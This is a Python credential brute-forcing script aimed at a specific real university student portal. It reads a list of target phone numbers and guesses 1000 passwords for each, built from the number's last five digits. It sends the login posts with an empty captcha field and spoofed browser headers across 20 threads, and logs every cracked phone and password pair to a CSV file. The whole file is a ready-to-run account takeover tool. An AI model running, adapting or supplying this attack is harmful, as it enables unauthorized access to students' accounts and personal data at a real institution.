import requests
import threading
import concurrent.futures
from datetime import datetime
import csv
import os

def read_target_numbers():
    """
    Read phone numbers from TARGET_NUMBERS.txt file
    Returns a list of phone numbers.
    """
    try:
        with open("TARGET_NUMBERS.txt", "r") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("Error: TARGET_NUMBERS.txt not found!")
        return []

def generate_passwords(phone_number):
    """
    Generate password combinations based on the last 5 digits of the phone number.
    Returns a list of passwords.
    """
    if len(phone_number) < 5 or not phone_number[-5:].isdigit():
        raise ValueError(f"Phone number {phone_number} must be at least 5 digits long.")

    base = phone_number[-5:]
    return [f"{base}{i:03d}" for i in range(1000)]

def get_headers():
    return {
        'authority': 'apps.dpu.edu.krd',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9,ar-IQ;q=0.8,ar;q=0.7',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://apps.dpu.edu.krd',
        'pragma': 'no-cache',
        'referer': 'https://apps.dpu.edu.krd/student_portal/',
        'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36'
    }

def attempt_login(phone_no, password):
    """
    Send POST request and return a tuple:
      (success_flag, response_text, status_code)
    """
    url = "https://apps.dpu.edu.krd/student_portal/"
    payload = {
        'phone_no': phone_no,
        'password': password,
        'g-recaptcha-response': '',
        'submit': '',
        'token': ''
    }
    response = requests.post(url, data=payload, headers=get_headers())
    success = "DPU Student Portal - Login" not in response.text
    return success, response.text, response.status_code

def worker(phone_no, password, lock):
    success, html, status = attempt_login(phone_no, password)
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    with lock:
        if success:
            # Save to a single CSV file for the current day
            csv_filename = f"RESULTS_{datetime.now().strftime('%Y%m%d')}.CSV"
            file_exists = os.path.exists(csv_filename)
            
            with open(csv_filename, 'a', newline='') as f:
                writer = csv.writer(f)
                if not file_exists:
                    writer.writerow(['Phone Number', 'Password', 'Timestamp'])
                writer.writerow([phone_no, password, timestamp])
                
            print(f"[{status}] [+] Success with phone: {phone_no}, password: `{password}` — saved to `{csv_filename}`")
        else:
            print(f"[{status}] [-] Failed with phone: {phone_no}, password: `{password}`")

def process_single_number(phone_number, lock):
    print(f"\nProcessing phone number: {phone_number}")
    
    # Generate passwords for this number
    try:
        passwords = generate_passwords(phone_number)
        print(f"✔ Generated {len(passwords)} combinations for {phone_number}")
        
        # Start the attack for this number
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            for pwd in passwords:
                executor.submit(worker, phone_number, pwd, lock)
    except ValueError as e:
        print(f"Error with {phone_number}: {str(e)}")

def main():
    # Read target numbers
    target_numbers = read_target_numbers()
    if not target_numbers:
        print("No phone numbers found to process. Please create TARGET_NUMBERS.txt with one phone number per line.")
        return
    
    print(f"Loaded {len(target_numbers)} phone numbers to process")
    
    # Create a single lock for all threads
    lock = threading.Lock()
    
    # Process each number
    for phone_number in target_numbers:
        process_single_number(phone_number, lock)

if __name__ == "__main__":
    main()